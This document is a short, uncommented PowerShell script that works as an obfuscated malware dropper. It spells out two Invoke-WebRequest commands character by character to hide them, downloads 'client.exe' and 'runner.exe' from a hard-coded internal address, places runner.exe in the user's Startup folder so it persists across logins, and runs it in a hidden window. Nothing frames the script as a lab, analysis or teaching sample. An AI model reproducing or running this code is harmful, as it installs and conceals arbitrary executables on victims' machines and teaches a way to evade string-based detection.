$targetDirectory = $env:LOCALAPPDATA
$executableName = "client.exe"
$outputPath = Join-Path -Path $targetDirectory -ChildPath $executableName


$appDataRoaming = $env:APPDATA
$startupPath = Join-Path $appDataRoaming "Microsoft\Windows\Start Menu\Programs\Startup"
$runnerName = "runner.exe"
$outputRunnerPath = Join-Path -Path $startupPath -ChildPath $runnerName


$WRARR = 'I', 'n', 'v', 'o', 'k', 'e', '-', 'W', 'e', 'b', 'R', 'e', 'q', 'u', 'e', 's', 't', ' ', '-', 'U', 'r', 'i', ' ', '"', 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '2', '2', '/', '$', 'e', 'x', 'e', 'c', 'u', 't', 'a', 'b', 'l', 'e', 'N', 'a', 'm', 'e', '"', ' ', '-', 'O', 'u', 't', 'F', 'i', 'l', 'e', ' ', '$', 'o', 'u', 't', 'p', 'u', 't', 'P', 'a', 't', 'h', ' ', '-', 'E', 'r', 'r', 'o', 'r', 'A', 'c', 't', 'i', 'o', 'n', ' ', 'S', 't', 'o', 'p'
$RNARR = 'I', 'n', 'v', 'o', 'k', 'e', '-', 'W', 'e', 'b', 'R', 'e', 'q', 'u', 'e', 's', 't', ' ', '-', 'U', 'r', 'i', ' ', '"', 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '2', '2', '/', '$', 'r', 'u', 'n', 'n', 'e', 'r', 'N', 'a', 'm', 'e', '"', ' ', '-', 'O', 'u', 't', 'F', 'i', 'l', 'e', ' ', '$', 'o', 'u', 't', 'p', 'u', 't', 'R', 'u', 'n', 'n', 'e', 'r', 'P', 'a', 't', 'h', ' ', '-', 'E', 'r', 'r', 'o', 'r', 'A', 'c', 't', 'i', 'o', 'n', ' ', 'S', 't', 'o', 'p'

$WR = -join $WRARR
$RN = -join $RNARR

Invoke-Expression $WR
Invoke-Expression $RN

Start-Process -FilePath "$outputRunnerPath" -WindowStyle Hidden
